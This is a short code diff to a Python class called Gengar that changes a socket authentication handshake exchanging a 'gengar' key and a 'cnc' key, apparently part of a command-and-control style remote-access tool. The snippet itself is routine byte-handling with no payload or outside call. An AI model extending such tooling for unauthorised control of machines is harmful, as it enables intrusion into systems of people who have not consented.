@@ -166,10 +166,10 @@ class Gengar:
 
         try:
             self._sock.settimeout(self._AUTH_TIMEOUT_SEC)
-            received_gengar_key = self._recvall(AuthenticationKeys.KEY_LEN).decode()
+            received_gengar_key = self._recvall(AuthenticationKeys.KEY_LEN)
             if received_gengar_key != self._AUTH_KEYS.gengar:
                 raise GengarAuthenticationFailed
-            self._send(self._AUTH_KEYS.cnc.encode())
+            self._send(self._AUTH_KEYS.cnc)
             self._authenticated = True
         except socket.timeout:
             raise GengarAuthenticationFailed
